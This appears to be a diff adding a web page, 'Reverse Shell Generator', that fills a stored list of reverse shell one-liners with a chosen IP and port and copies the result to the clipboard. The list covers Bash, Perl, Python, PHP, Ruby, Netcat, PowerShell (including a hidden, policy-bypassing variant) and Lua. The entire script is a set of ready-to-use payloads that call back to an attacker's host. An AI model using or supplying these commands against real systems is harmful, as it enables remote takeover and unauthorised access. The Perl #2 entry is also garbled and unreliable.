@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link rel="stylesheet" href="assets/bootstrap.min.css">
+    <script src="assets/clipboard.min.js"></script>
+    <style>
+        .user-parameter {
+            color: red;
+            font-weight: bold;
+        }
+        @media (max-width: 768px) {
+            div.flex-grow-1 {
+                overflow: auto !important;
+            }
+        }
+    </style>
+
+    <title>Reverse Shell Generator</title>
+</head>
+
+<body>
+<div class="container d-flex flex-column vh-100">
+    <div class="row justify-content-center">
+        <h1>Reverse Shell Generator</h1>
+    </div>
+
+    <form class="mt-4">
+        <div class="form-row justify-content-center">
+            <div class="col-auto">
+                <div class="input-group">
+                    <div class="input-group-prepend"><span id="ip-label" class="input-group-text">IP</span></div>
+                    <input id="ip" type="text" class="form-control form-control-lg pr-2" size="11" maxlength="15"
+                           placeholder="10.10.10.10" aria-label="IP" aria-describedby="ip-label" onkeydown="update()"
+                           onkeyup="update()">
+                </div>
+            </div>
+
+            <div class="col-auto">
+                <div class="input-group">
+                    <div class="input-group-prepend"><span id="port-label" class="input-group-text">Port</span></div>
+                    <input id="port" type="text" class="form-control form-control-lg" size="3" maxlength="5"
+                           placeholder="4242" aria-label="Port" aria-describedby="port-label" onkeydown="update()"
+                           onkeyup="update()">
+                </div>
+            </div>
+        </div>
+    </form>
+
+    <div id="advanced-button" class="row small justify-content-center mt-2 mb-5" style="min-height: 38px">
+        <a href="#" onclick="activateAdvanced(); return false">Advanced &hellip;</a>
+    </div>
+
+    <form id="advanced-settings" class="form-inline justify-content-center mt-2 mb-5" style="display: none">
+        <label for="shell" class="mr-2">Shell:</label>
+        <select class="custom-select" id="shell" onchange="update()">
+            <option selected>sh</option>
+            <option>bash</option>
+            <option>ash</option>
+            <option>bsh</option>
+            <option>csh</option>
+            <option>ksh</option>
+            <option>zsh</option>
+            <option>pdksh</option>
+            <option>tcsh</option>
+        </select>
+
+        <div class="custom-control custom-switch ml-4">
+            <input type="checkbox" class="custom-control-input" id="quote-switch">
+            <label class="custom-control-label" for="quote-switch">Auto-copy to clipboard</label>
+        </div>
+    </form>
+
+    <div class="row flex-grow-1 overflow-hidden mb-5 h-100">
+        <div class="col-12 col-md-3 d-flex flex-column h-100">
+            <div id="clickable-list" class="list-group flex-grow-1 overflow-auto"></div>
+        </div>
+
+        <div class="col-12 col-md-9 h-100 overflow-auto">
+            <div class="m-0 border">
+                <button type="button" class="btn btn-link btn-sm position-absolute copy-to-clipboard"
+                        style="top: 1em; right: 2em" data-clipboard-target="#shell-output" title="Copy to clipboard">
+                    Copy
+                </button>
+                <pre id="shell-output" class="bg-light text-wrap text-break w-100 p-4 mb-0"
+                     style="padding-right: 5em !important; outline: 0 solid transparent;" contenteditable="true"></pre>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    var shells = {
+        'Bash #1': '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1',
+        'Bash #2': '0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196',
+        'Perl #1': 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/{shell} -i");};\'',
+        'Perl #2': 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{port}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
+        'Python #1': 'export RHOST="{ip}";export RPORT={port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/{shell}")\'',
+        'Python #2': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/{shell}")\'',
+        'PHP #1': 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/{shell} -i <&3 >&3 2>&3");\'',
+        'PHP #2': 'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("/bin/{shell} -i <&3 >&3 2>&3");\'',
+        'PHP #3': 'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/{shell} -i <&3 >&3 2>&3");\'',
+        'Ruby #1': 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/{shell} -i <&%d >&%d 2>&%d",f,f,f)\'',
+        'Ruby #2': 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
+        'Netcat #1': 'nc -e /bin/{shell} {ip} {port}',
+        'Netcat #2': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/{shell} -i 2>&1|nc {ip} {port} >/tmp/f',
+        'PowerShell #1': 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
+        'PowerShell #2': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
+        'Lua': 'lua5.1 -e \'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\''
+
+    }
+    var currentCommandName
+
+    function update() {
+        document.querySelectorAll('.list-group-item.active').forEach(function (el) {
+            el.classList.remove('active')
+        })
+        document.querySelectorAll('.list-group-item').forEach(function (el) {
+            if (el.innerText === currentCommandName) el.classList.add('active')
+        })
+
+        var ip = document.getElementById('ip').value || document.getElementById('ip').placeholder
+        var port = document.getElementById('port').value || document.getElementById('port').placeholder
+        var shell = document.getElementById('shell').value
+        var command = shells[currentCommandName]
+            .replace('{ip}', '<span class="user-parameter">' + ip + '</span>')
+            .replace('{port}', '<span class="user-parameter">' + port + '</span>')
+            .replace('{shell}', '<span class="user-parameter">' + shell + '</span>')
+        document.getElementById('shell-output').innerHTML = command
+    }
+
+    function activateAdvanced() {
+        document.getElementById('advanced-button').style.display = 'none'
+        document.getElementById('advanced-settings').style.display = 'flex'
+    }
+
+    window.addEventListener('load', function () {
+        var commandNames = Object.keys(shells).sort()
+        commandNames.forEach(function (commandName) {
+            var entryElement = document.createElement('a')
+            entryElement.href = '#'
+            entryElement.innerText = commandName
+            entryElement.classList.add('list-group-item', 'list-group-item-action')
+            entryElement.onclick = function () {
+                currentCommandName = commandName
+                update()
+                if (document.getElementById('quote-switch').checked) {
+                    document.querySelector('.copy-to-clipboard').click()
+                }
+                return false
+            }
+            document.getElementById('clickable-list').appendChild(entryElement)
+        })
+
+        currentCommandName = 'Bash #1'
+        update()
+    })
+
+    var clipboard = new ClipboardJS('.copy-to-clipboard')
+    clipboard.on('success', (event) => {
+        event.clearSelection()
+    });
+</script>
+
+</body>
+</html>
